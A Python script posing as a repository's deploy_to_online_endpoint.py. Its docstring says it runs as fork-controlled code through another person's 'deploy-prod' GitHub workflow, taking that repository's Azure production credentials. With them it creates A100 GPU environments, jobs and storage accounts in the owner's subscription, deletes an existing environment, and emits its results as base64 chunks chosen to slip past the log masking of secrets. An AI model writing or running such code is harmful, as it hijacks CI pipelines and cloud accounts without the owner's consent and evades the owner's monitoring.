#!/usr/bin/env python3
"""C211-I127692: mslearn subscription 790067ff Container Apps A100 CONCURRENCY proof.

Runs as the fork-controlled src/deploy_to_online_endpoint.py under the
christiansegercrantz/mslearn-mlops 'deploy-prod' issue_comment workflow (environment prod,
AZURE_CREDENTIALS -> ARM token for subscription 790067ff, RG chriso-sandbox-rg).

Lane 127464 (fact 127664) proved parallelism=2 is ACCEPTED but replicaCompletionCount=1 makes
the execution finish at the FIRST successful replica, so only ONE A100 UUID ever appeared.
This probe changes the completion semantic and adds a hold-open:

  (a) verify whether the residual environment c211-i127464-cae still exists; if GET 200
      DELETE it and poll to 404 / list-absence (verbatim either way),
  (b) create ONE nonce Consumption-GPU-NC24-A100 environment in eastus,
  (c) create ONE nonce manual-trigger job with parallelism=2 AND replicaCompletionCount=2
      (execution can only Succeed when BOTH replicas succeed) plus replicaTimeout=900,
  (d) every replica FIRST writes a start-marker blob (host + UTC epoch), then prints
      nvidia-smi -L / --query-gpu=name,uuid,memory.total,driver_version, writes its device blob,
      then holds open (sleep HOLD) so the replica intervals must overlap, then writes an
      end-marker blob with its end epoch,
  (e) independent ARM readback of the job's manualTriggerConfig and each execution's status,
  (f) teardown job -> environment -> storage account and prove GET 404 / list-empty.

Concurrency is claimed ONLY if: 2 start markers from 2 different hosts, 2 DISTINCT A100 UUIDs,
the [start,end] intervals overlap, and the ARM execution Succeeded.  Otherwise the verbatim
matrix (1 UUID / 1 replica / Failed / etc.) is recorded.

stdout is a flat tag|k=v format (no JSON braces: this repo's logs mask brace runs because
AZURE_CREDENTIALS contains JSON).  A compact JSON result is also emitted zlib+b64 in chunks.
stdlib only.
"""
import base64
import hashlib
import hmac
import json
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib

ARM = "https://management.azure.com"
RG = "chriso-sandbox-rg"
TAG = "C211_I127692"
INTENT = "I127692"
NONCE = "x127692cap"
DEADLINE = 4200
T0 = time.time()

APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC24-A100"
SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
REGION = "eastus"
HOLD_S = 120

ENV_NAME = "c211-i127692-cae"
JOB_NAME = "c211-i127692-job"
SA_NAME = ("c211i127692" + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]
RESIDUAL_ENV = "c211-i127464-cae"

UUID_RE = re.compile(r"GPU-[0-9a-fA-F-]{16,}")
R = {"tag": TAG, "nonce": NONCE, "started": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        if v is None:
            continue
        parts.append("%s=%s" % (clean(k), clean(v)[:900]))
    line = "|".join(parts)
    print(line, flush=True)
    R.setdefault("lines", []).append(line)


def dump_b64():
    try:
        R["elapsed_s"] = int(time.time() - T0)
        blob = base64.b64encode(zlib.compress(json.dumps(R, default=str).encode(), 9)).decode()
        for i in range(0, len(blob), 3000):
            print("C211_%s_B64 %08d %s" % (INTENT, i // 3000, blob[i:i + 3000]), flush=True)
    except Exception as e:  # noqa: BLE001
        print("%s|step=b64-fail|err=%s" % (TAG, clean(e)), flush=True)


def left():
    return DEADLINE - (time.time() - T0)


def run(cmd, timeout=180):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)[:300]}


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"), "message": clean(e.get("message", ""))[:500]}
        if "raw" in body:
            return {"http": st, "raw": clean(body["raw"])[:400]}
        if "transport_error" in body:
            return {"http": st, "transport_error": body["transport_error"]}
    return {"http": st}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    data = body if isinstance(body, bytes) else (body.encode() if body is not None else None)
    req = urllib.request.Request(url, data=data, method=method, headers=dict(headers or {}))
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()
    except urllib.error.HTTPError as e:
        return e.code, e.read() or b""
    except Exception as e:  # noqa: BLE001
        return -1, str(e).encode()


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=3):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def b64(s):
    if not s:
        return ""
    return base64.b64encode(str(s).encode("utf-8", "replace")).decode()


def blob_list(container_url, q, prefix):
    st, body = httptext("%s?restype=container&comp=list&prefix=%s&%s"
                        % (container_url, urllib.parse.quote(prefix), q), timeout=60)
    names = []
    if st == 200:
        names = re.findall(r"<Name>([^<]+)</Name>", body.decode("utf-8", "replace"))
    return st, names, body.decode("utf-8", "replace")[:800]


def blob_get(container_url, q, name):
    st, body = httptext("%s/%s?%s" % (container_url, name, q), timeout=60)
    return st, body


def wait_gone(tok, url, label, tries=24, sleep_s=10):
    for i in range(tries):
        st, _ = arm(tok, url, timeout=60)
        emit("%s-absent-poll" % label, i=i, http=st)
        if st == 404:
            return True
        time.sleep(sleep_s)
    return False


def replica_cmd(container_url, q):
    """One shell command executed in EVERY replica.

    Order matters for the concurrency proof:
      1. start marker blob (hostname + UTC epoch)  -> proves how many replicas the platform started
      2. nvidia-smi device proof                   -> distinct A100 UUID per replica
      3. device blob
      4. hold open (sleep HOLD_S)                  -> forces the replica intervals to overlap
      5. end marker blob (end epoch)               -> interval overlap test
    """
    put = ("curl -sS -X PUT \"%s/$BLOB?%s\" -H 'x-ms-blob-type: BlockBlob' "
           "-H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' "
           "--data-binary @$OUT -w 'C211_UPLOAD_HTTP=%%{http_code}\\n'"
           % (container_url, q))
    dev = (
        'echo ---DRIVER---; cat /proc/driver/nvidia/version 2>/dev/null; '
        'for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /bin/nvidia-smi; do '
        'if [ -x "$p" ]; then echo FOUND=$p; "$p" -L; echo ---SMI-Q---; '
        '"$p" --query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader; fi; done; '
        'command -v nvidia-smi >/dev/null 2>&1 && { nvidia-smi -L; nvidia-smi '
        '--query-gpu=name,uuid,memory.total,driver_version --format=csv,noheader; }; '
        'echo ---DEVS---; ls -l /dev/nvidia* 2>/dev/null; '
        'echo C211-END'
    )
    script = (
        'H=$(hostname); S=$(date -u +%s); echo "HOST=$H START_EPOCH=$S"; date -u; '
        'OUT=/tmp/c211-start.txt; { echo HOST=$H; echo KIND=start; echo START_EPOCH=$S; '
        'date -u; echo TAG=@@TAG@@; } > $OUT; cat $OUT; '
        'BLOB="c211/@@NONCE@@-start-$H.txt"; @@PUT@@; '
        'OUT=/tmp/c211-dev.txt; { echo HOST=$H; echo KIND=dev; echo START_EPOCH=$S; '
        '@@DEV@@; echo DEV_EPOCH=$(date -u +%s); } > $OUT 2>&1; cat $OUT; '
        'BLOB="c211/@@NONCE@@-dev-$H.txt"; @@PUT@@; '
        'sleep @@HOLD@@; '
        'OUT=/tmp/c211-end.txt; { echo HOST=$H; echo KIND=end; echo START_EPOCH=$S; '
        'echo END_EPOCH=$(date -u +%s); date -u; } > $OUT; cat $OUT; '
        'BLOB="c211/@@NONCE@@-end-$H.txt"; @@PUT@@; echo C211_UPLOAD_DONE'
    )
    script = (script.replace('@@PUT@@', put).replace('@@DEV@@', dev)
                    .replace('@@TAG@@', TAG).replace('@@NONCE@@', NONCE)
                    .replace('@@HOLD@@', str(HOLD_S)))
    return ["/bin/bash", "-c", script]


def do_execution(tok, baseurl, job_readback_parallelism, tag_phase, container_url, q):
    """Start ONE execution, poll to terminal, collect every replica marker blob, return dict."""
    ex = {"phase": tag_phase, "parallelism": job_readback_parallelism}
    st, b = arm(tok, "%s/start?api-version=%s" % (baseurl, APP_VER), method="POST", body={},
                timeout=120)
    execname = (b.get("name") if isinstance(b, dict) else None)
    ex["start_http"] = st
    ex["execname"] = execname
    if st not in (200, 201, 202) or not execname:
        ex["start_err"] = err_of(st, b)
        emit("exec-start-fail", phase=tag_phase, **err_of(st, b))
        return ex
    emit("exec-start", phase=tag_phase, execname=execname, http=st)
    exurl = "%s/executions/%s?api-version=%s" % (baseurl, execname, APP_VER)
    deadline = time.time() + min(1100, max(420, left() - 780))
    poll_i = 0
    status = None
    blobs = {}
    while time.time() < deadline:
        stp, bp = arm(tok, exurl, timeout=60)
        p = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
        status = p.get("status")
        stl, names, raw = blob_list(container_url, q, "c211/%s-" % NONCE)
        for nm in names:
            if nm not in blobs:
                stg, body = blob_get(container_url, q, nm)
                blobs[nm] = {"http": stg, "text": body.decode("utf-8", "replace")[:9000]}
        starts = sorted({nm for nm in blobs if "-start-" in nm})
        ends = sorted({nm for nm in blobs if "-end-" in nm})
        uuids = sorted({u for nm, v in blobs.items() if "-start-" not in nm
                        for u in UUID_RE.findall(v["text"])})
        emit("exec-poll", phase=tag_phase, i=poll_i, http=stp, status=status,
             reason=p.get("reason"), startTime=p.get("startTime"), endTime=p.get("endTime"),
             blobs_n=len(blobs), starts_n=len(starts), ends_n=len(ends),
             distinct_uuids=len(uuids))
        if status in ("Succeeded", "Failed", "Canceled") and poll_i > 2:
            if len(starts) >= 2 or status != "Succeeded":
                break
            # Succeeded with fewer than 2 replicas: one more pass for late blobs
            if poll_i > 5:
                break
        poll_i += 1
        time.sleep(15)
    # final collection: give late replicas one more pass
    stl, names, raw = blob_list(container_url, q, "c211/%s-" % NONCE)
    for nm in names:
        if nm not in blobs:
            stg, body = blob_get(container_url, q, nm)
            blobs[nm] = {"http": stg, "text": body.decode("utf-8", "replace")[:9000]}
    per = []
    for i, nm in enumerate(sorted(blobs)):
        txt = blobs[nm]["text"]
        host = None
        for ln in txt.splitlines():
            if ln.startswith("HOST="):
                host = ln[5:].strip()
        us = sorted(set(UUID_RE.findall(txt)))
        se = None
        ee = None
        for ln in txt.splitlines():
            if ln.startswith("START_EPOCH="):
                try:
                    se = int(ln.split("=", 1)[1].strip())
                except Exception:  # noqa: BLE001
                    pass
            if ln.startswith("END_EPOCH="):
                try:
                    ee = int(ln.split("=", 1)[1].strip())
                except Exception:  # noqa: BLE001
                    pass
        kind = "start" if "-start-" in nm else ("end" if "-end-" in nm else "dev")
        per.append({"blob": nm, "kind": kind, "host": host, "uuids": us,
                    "start_epoch": se, "end_epoch": ee,
                    "len": len(txt), "http": blobs[nm]["http"]})
        emit("replica", phase=tag_phase, idx=i, name=nm.split("/")[-1], kind=kind, host=host,
             n_uuid=len(us), uuids=";".join(us)[:400], bytes=len(txt),
             start_epoch=se, end_epoch=ee)
    st, xb = arm(tok, exurl, timeout=60)
    xp = (xb.get("properties") or {}) if isinstance(xb, dict) else {}
    ex["readback"] = {"http": st, "status": xp.get("status"), "reason": xp.get("reason"),
                      "startTime": xp.get("startTime"), "endTime": xp.get("endTime"),
                      "provisioningState": xp.get("provisioningState")}
    emit("exec-readback", phase=tag_phase, http=st, status=xp.get("status"),
         reason=xp.get("reason"), startTime=xp.get("startTime"), endTime=xp.get("endTime"))
    sr, rb = arm(tok, "%s/executions/%s/replicas?api-version=%s" % (baseurl, execname, APP_VER),
                 timeout=60)
    rv = (rb.get("value") or []) if isinstance(rb, dict) else []
    emit("exec-replicas-list", phase=tag_phase, http=sr, n=len(rv),
         names=";".join(str(x.get("name")) for x in rv[:10]))
    ex["replicas_list"] = {"http": sr, "n": len(rv)}

    # concurrency analysis: per-host device UUIDs + interval overlap
    hosts = {}
    for p in per:
        if p["kind"] == "dev" and p["uuids"]:
            hosts.setdefault(p["host"] or p["blob"], set()).update(p["uuids"])
    intervals = {}
    for p in per:
        h = p["host"] or p["blob"]
        if p["start_epoch"] is not None:
            intervals.setdefault(h, {})["start"] = p["start_epoch"]
        if p["end_epoch"] is not None:
            intervals.setdefault(h, {})["end"] = p["end_epoch"]
    overlap = False
    hosts_iv = [(h, v.get("start"), v.get("end")) for h, v in intervals.items()
                if v.get("start") is not None and v.get("end") is not None]
    for i in range(len(hosts_iv)):
        for j in range(i + 1, len(hosts_iv)):
            a, b = hosts_iv[i], hosts_iv[j]
            if a[1] < b[2] and b[1] < a[2]:
                overlap = True
    distinct = sorted({u for s in hosts.values() for u in s})
    ex["per_replica"] = per
    ex["per_host_uuids"] = {h: sorted(s) for h, s in hosts.items()}
    ex["intervals"] = {h: v for h, v in intervals.items()}
    ex["intervals_overlap"] = overlap
    ex["replica_hosts_started"] = sorted({p["host"] for p in per
                                          if p["kind"] == "start" and p["host"]})
    ex["distinct_uuids"] = distinct
    ex["status"] = status
    emit("exec-summary", phase=tag_phase, status=status, blobs_n=len(per),
         start_markers=len(ex["replica_hosts_started"]),
         hosts=";".join(ex["replica_hosts_started"])[:400],
         distinct=len(distinct), uuids=";".join(distinct)[:600], overlap=overlap)
    return ex


def teardown(tok, joburl, envurl, saurl):
    td = {}
    st, b = arm(tok, joburl, method="DELETE", timeout=240)
    td["job_delete"] = st
    emit("job-delete", name=JOB_NAME, http=st, **({} if st in (200, 202, 204, 404) else err_of(st, b)))
    td["job_gone"] = wait_gone(tok, joburl, "job", tries=20, sleep_s=8)
    st, b = arm(tok, envurl, method="DELETE", timeout=300)
    td["env_delete"] = st
    emit("env-delete", name=ENV_NAME, http=st, **({} if st in (200, 202, 204, 404) else err_of(st, b)))
    td["env_gone"] = wait_gone(tok, envurl, "env", tries=18, sleep_s=10)
    st, b = arm(tok, saurl, method="DELETE", timeout=240)
    td["sa_delete"] = st
    emit("sa-delete", name=SA_NAME, http=st, **({} if st in (200, 202, 204, 404) else err_of(st, b)))
    td["sa_gone"] = wait_gone(tok, saurl, "sa", tries=16, sleep_s=8)
    return td


def check_residual(tok, envurl, list_url):
    """(a) Does residual c211-i127464-cae still exist?  Delete it to 404/list-absence if so."""
    out = {}
    st, b = arm(tok, envurl, timeout=90)
    props = (b.get("properties") or {}) if isinstance(b, dict) else {}
    out["get_http"] = st
    out["state"] = props.get("provisioningState")
    out["default_domain"] = props.get("defaultDomain")
    emit("residual-check", name=RESIDUAL_ENV, http=st, state=out["state"],
         defaultDomain=out["default_domain"])
    if st == 200:
        sd, bd = arm(tok, envurl, method="DELETE", timeout=300)
        out["delete_http"] = sd
        emit("residual-delete", name=RESIDUAL_ENV, http=sd,
             **({} if sd in (200, 202, 204, 404) else err_of(sd, bd)))
        out["gone"] = wait_gone(tok, envurl, "residual-env", tries=18, sleep_s=10)
        out["get_after"] = None
        st2, _ = arm(tok, envurl, timeout=60)
        out["get_after"] = st2
        emit("residual-after", name=RESIDUAL_ENV, http=st2)
    else:
        out["delete_http"] = None
        out["gone"] = (st == 404)
    # list-absence readback regardless
    stl, lst = arm(tok, list_url, timeout=120)
    names = [x.get("name") for x in ((lst.get("value") or []) if isinstance(lst, dict) else [])]
    out["list_http"] = stl
    out["list_contains_residual"] = RESIDUAL_ENV in names
    out["list_names"] = names
    emit("residual-list", http=stl, n=len(names), present=out["list_contains_residual"],
         names=";".join(sorted(names))[:600])
    return out


def main():
    sid = None
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             user_type=(acc.get("user") or {}).get("type"), tenant=acc.get("tenantId"),
             expect_match=(sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:200])
        dump_b64()
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"], timeout=120)
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        tok = None
    emit("arm-token", got=bool(tok), len=len(tok or ""))
    if not sid or not tok:
        emit("DONE", phase="fatal", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        dump_b64()
        return

    envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
              "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, ENV_NAME, APP_VER))
    residualurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
                   "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, RESIDUAL_ENV, APP_VER))
    envlisturl = ("%s/subscriptions/%s/providers/Microsoft.App/managedEnvironments"
                  "?api-version=%s" % (ARM, sid, APP_VER))
    joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s"
              "?api-version=%s" % (ARM, sid, RG, JOB_NAME, APP_VER))
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/"
             "storageAccounts/%s?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
    jobbase = joburl.split("?")[0]

    # 0) providers + inventory (context; never touch other lanes' c211 resources)
    for ns in ("Microsoft.Storage", "Microsoft.App", "Microsoft.Network"):
        st, b = arm(tok, "%s/subscriptions/%s/providers/%s?api-version=2021-04-01" % (ARM, sid, ns))
        emit("provider", ns=ns, http=st,
             registrationState=(b.get("registrationState") if isinstance(b, dict) else None))
    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/resources?api-version=2021-04-01"
                 % (ARM, sid, RG), timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = ["%s:%s" % (x.get("name"), x.get("type")) for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    emit("rg-inventory", http=st, total=len(allres), c211_n=len(mine),
         c211_names=";".join(mine)[:1200])

    # 0b) residual environment c211-i127464-cae: verify + delete to 404 / list-absence
    try:
        R["residual"] = check_residual(tok, residualurl, envlisturl)
    except Exception as e:  # noqa: BLE001
        emit("residual-error", err=str(e)[:300])

    td = {}
    try:
        # 1) storage account + container + account SAS
        sabody = {"location": REGION, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                  "tags": {"c211": "i127692", "nonce": NONCE},
                  "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                                 "supportsHttpsTrafficOnly": True,
                                 "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
        st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
        emit("sa-create", name=SA_NAME, **err_of(st, b))
        if st not in (200, 201, 202):
            emit("DONE", phase="capp", verdict="SA_CREATE_REFUSED", elapsed_s=int(time.time() - T0))
            return
        for i in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            emit("sa-poll", i=i, http=stp, state=ps)
            if ps == "Succeeded":
                break
            time.sleep(8)
        st, kb = arm(tok, "%s/listKeys?api-version=%s" % (saurl.split("?")[0], STG_VER),
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
        sas_base = None
        if key:
            q, se = sa_sas(SA_NAME, key)
            base = "https://%s.blob.core.windows.net" % SA_NAME
            stc, bc = httptext("%s/c211?restype=container&%s" % (base, q), method="PUT")
            emit("sa-container", http=stc, body=b64(bc[:200].decode("utf-8", "replace")))
            if stc in (201, 409):
                sas_base = ("%s/c211" % base, q)
                emit("sa-sas", ok=True, container="c211", expires=se)
        if not sas_base:
            emit("DONE", phase="capp", verdict="NO_SAS", elapsed_s=int(time.time() - T0))
            return

        # 2) ONE nonce A100 environment in eastus (proven recipe)
        envbody = {"location": REGION, "tags": {"c211": "i127692", "nonce": NONCE},
                   "properties": {"workloadProfiles": [
                       {"name": "Consumption", "workloadProfileType": "Consumption"},
                       {"name": PROFILE, "workloadProfileType": PROFILE}]}}
        st, b = arm(tok, envurl, method="PUT", body=envbody, timeout=300)
        emit("capp-env-create", name=ENV_NAME, profile=PROFILE, region=REGION, **err_of(st, b))
        env_id = None
        if st in (200, 201):
            dl = time.time() + min(1500, max(600, left() - 1100))
            ps = None
            i = 0
            while time.time() < dl:
                stp, bp = arm(tok, envurl, timeout=60)
                props = (bp.get("properties") or {}) if isinstance(bp, dict) else {}
                ps = props.get("provisioningState")
                emit("capp-env-poll", i=i, http=stp, state=ps,
                     environmentMode=props.get("environmentMode"),
                     profiles=";".join("%s:%s" % (w.get("name"), w.get("workloadProfileType"))
                                       for w in (props.get("workloadProfiles") or []))[:400])
                if ps in ("Succeeded", "Failed", "Canceled"):
                    break
                i += 1
                time.sleep(20)
            if ps == "Succeeded":
                st, env = arm(tok, envurl, timeout=60)
                env_id = env.get("id") if isinstance(env, dict) else None
                epp = (env.get("properties") or {}) if isinstance(env, dict) else {}
                emit("env-ready", name=ENV_NAME, region=REGION, id_ok=bool(env_id),
                     state=epp.get("provisioningState"), defaultDomain=epp.get("defaultDomain"))
            else:
                stf, bf = arm(tok, envurl, timeout=60)
                fp = (bf.get("properties") or {}) if isinstance(bf, dict) else {}
                emit("env-not-ready", state=ps,
                     last_error=clean(json.dumps(fp.get("lastDeploymentErrors")
                                                 or fp.get("errors") or ""))[:600])
        if not env_id:
            emit("DONE", phase="capp", verdict="A100_ENV_NOT_AVAILABLE",
                 elapsed_s=int(time.time() - T0))
            return

        # 3) ONE nonce manual job: parallelism=2 AND replicaCompletionCount=2 (hold-open replicas)
        cmd = replica_cmd(*sas_base)
        jobbody = {"location": REGION, "tags": {"c211": "i127692", "nonce": NONCE},
                   "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                                  "configuration": {"triggerType": "Manual", "replicaRetryLimit": 0,
                                                    "replicaTimeout": 900,
                                                    "manualTriggerConfig": {
                                                        "replicaCompletionCount": 2,
                                                        "parallelism": 2}},
                                  "template": {"containers": [{
                                      "name": "gpu", "image": IMAGE, "command": cmd,
                                      "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
        st, b = arm(tok, joburl, method="PUT", body=jobbody, timeout=180)
        emit("capp-job-create", name=JOB_NAME, profile=PROFILE, region=REGION,
             want_parallelism=2, want_completion=2, **err_of(st, b))
        R["job_create"] = {"http": st, "err": err_of(st, b)}
        if st not in (200, 201):
            emit("DONE", phase="capp", verdict="JOB_CREATE_REFUSED", elapsed_s=int(time.time() - T0))
            return
        st, jb = arm(tok, joburl, timeout=60)
        jp = (jb.get("properties") or {}) if isinstance(jb, dict) else {}
        mtc = ((jp.get("configuration") or {}).get("manualTriggerConfig") or {})
        emit("job-readback", http=st, parallelism=mtc.get("parallelism"),
             replicaCompletionCount=mtc.get("replicaCompletionCount"),
             replicaTimeout=(jp.get("configuration") or {}).get("replicaTimeout"),
             workloadProfileName=jp.get("workloadProfileName"),
             triggerType=(jp.get("configuration") or {}).get("triggerType"))
        R["job_readback"] = {"http": st, "parallelism": mtc.get("parallelism"),
                             "replicaCompletionCount": mtc.get("replicaCompletionCount"),
                             "replicaTimeout": (jp.get("configuration") or {}).get("replicaTimeout")}
        plat_par = mtc.get("parallelism")

        ex = do_execution(tok, jobbase, plat_par, "n2c2", *sas_base)
        R["exec"] = {k: v for k, v in ex.items() if k != "per_replica"}
        R["exec"]["per_replica"] = ex.get("per_replica")

        hosts_started = ex.get("replica_hosts_started") or []
        distinct = ex.get("distinct_uuids") or []
        overlap = bool(ex.get("intervals_overlap"))
        max_concurrent = 0
        if len(distinct) >= 2 and overlap and (ex.get("status") == "Succeeded"):
            max_concurrent = 2
        elif len(distinct) >= 2 and overlap:
            max_concurrent = 2
        elif len(distinct) >= 1:
            max_concurrent = 1
        R["concurrency"] = {"replica_hosts_started": len(hosts_started),
                            "distinct_uuids": len(distinct),
                            "intervals_overlap": overlap,
                            "exec_status": ex.get("status"),
                            "max_concurrent_proven": max_concurrent}
        emit("concurrency", replica_hosts_started=len(hosts_started),
             distinct_uuids=len(distinct), overlap=overlap, exec_status=ex.get("status"),
             max_proven=max_concurrent)
    finally:
        try:
            td = teardown(tok, joburl, envurl, saurl)
        except Exception as e:  # noqa: BLE001
            emit("teardown-error", err=str(e)[:300])
        R["teardown"] = td

    # 4) absence proof
    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/resources?api-version=2021-04-01"
                 % (ARM, sid, RG), timeout=120)
    allres = (rl.get("value") or []) if isinstance(rl, dict) else []
    mine = ["%s:%s" % (x.get("name"), x.get("type")) for x in allres
            if str(x.get("name", "")).lower().startswith("c211")]
    own = [x for x in mine if "i127692" in x.lower()]
    emit("rg-final", http=st, total=len(allres),
         c211_left=("NO_RESULTS" if not mine else ";".join(mine)[:1200]),
         c211_i127692_left=("NO_RESULTS" if not own else ";".join(own)))
    for label, path in (("jobs", "/subscriptions/%s/providers/Microsoft.App/jobs"),
                        ("envs", "/subscriptions/%s/providers/Microsoft.App/managedEnvironments")):
        st, lst = arm(tok, "%s%s?api-version=%s" % (ARM, path % sid, APP_VER), timeout=120)
        names = [x.get("name") for x in ((lst.get("value") or []) if isinstance(lst, dict) else [])
                 if str(x.get("name", "")).lower().startswith("c211")]
        emit("list-" + label, http=st,
             n_total=len(((lst.get("value") or []) if isinstance(lst, dict) else [])),
             c211=("NO_RESULTS" if not names else ";".join(names)[:600]),
             has_i127692=("i127692" in ";".join(str(n) for n in names).lower()))
    ste, _ = arm(tok, envurl, timeout=60)
    stj, _ = arm(tok, joburl, timeout=60)
    sts, _ = arm(tok, saurl, timeout=60)
    stre, _ = arm(tok, residualurl, timeout=60)
    emit("final-get", env_http=ste, job_http=stj, sa_http=sts, residual_env_http=stre)
    verdict = ("ENV_ABSENT_JOB_ABSENT_SA_ABSENT"
               if (ste == 404 and stj == 404 and sts == 404) else "RESIDUAL_PRESENT")
    R["final_get"] = {"env": ste, "job": stj, "sa": sts, "residual_env": stre,
                      "verdict": verdict}
    emit("DONE", phase="capp", verdict=verdict, elapsed_s=int(time.time() - T0),
         max_concurrent=(R.get("concurrency") or {}).get("max_concurrent_proven"))
    dump_b64()


if __name__ == "__main__":
    try:
        main()
    except Exception as e:  # noqa: BLE001
        import traceback
        emit("crash", err=str(e)[:400], tb=traceback.format_exc()[-800:])
        dump_b64()
